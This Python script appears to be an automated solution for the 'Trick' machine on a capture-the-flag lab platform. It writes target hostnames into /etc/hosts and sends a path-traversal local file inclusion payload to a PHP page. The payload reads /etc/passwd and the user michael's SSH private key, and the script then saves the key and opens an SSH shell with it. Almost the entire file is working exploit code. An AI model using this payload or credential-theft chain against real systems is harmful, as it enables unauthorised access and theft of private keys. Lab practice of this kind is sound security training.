#!/usr/bin/env python3

import argparse
import subprocess
import shlex
import requests
import pty

class Test:
    def __init__(self, target_name, target_ip):
        self.target_name = target_name
        self.target_ip = target_ip

    def log(self, msg):
        print(f"[*] {msg}")

    def execute(self, cmd, **kwargs):
        '''
        Execute local command
        '''
        argv = shlex.split(cmd)
        p = subprocess.run(argv, **kwargs)
        return p

    def add_hosts(self):
        '''
        Add hostname into /etc/hosts
        '''
        self.log('Add target hostname into /etc/hosts')
        hostnames = [
                'trick',
                'trick.htb',
                'preprod-payload.trick.htb',
                'preprod-marketing.trick.htb'
                ]
        cmd = f"sh -c \"echo {self.target_ip} {' '.join(hostnames)} >> /etc/hosts\""
        self.execute(cmd)

    def lfi(self, path):
        '''
        Read file on the target using the LFI vulnerability found on site "preprod-marketing.trick.htb"
        '''
        self.log(f"Read file {path} via LFI vulnerability found on site \"preprod-marketing.trick.htb\"")
        url = 'http://preprod-marketing.trick.htb/index.php?page=.....//....//....//....//....//' + path
        res = requests.get(url)
        return res.text

    def run(self):
        self.add_hosts()
        passwd = self.lfi('/etc/passwd')
        print(passwd)
        ssh_key = self.lfi('/home/michael/.ssh/id_rsa')

        self.log(f"Got SSH private key:\n{ssh_key}")
        self.log('Save as file michael.id_rsa')
        with open('michael.id_rsa', 'w') as fout:
            fout.write(ssh_key)

        self.log('Change permission')
        self.execute('chmod 600 michael.id_rsa')
        p = self.execute('ls -al michael.id_rsa', capture_output=True)
        print("%s" % p.stdout.decode())
        pty.spawn(shlex.split('/usr/bin/ssh -i michael.id_rsa michael@trick'))

TARGET_NAME = 'trick'
if __name__ == '__main__':
    parser = argparse.ArgumentParser('')
    parser.add_argument('target', help="The target's IP")

    args = parser.parse_args()
    target = args.target

    test = Test(TARGET_NAME, target)
    test.run()
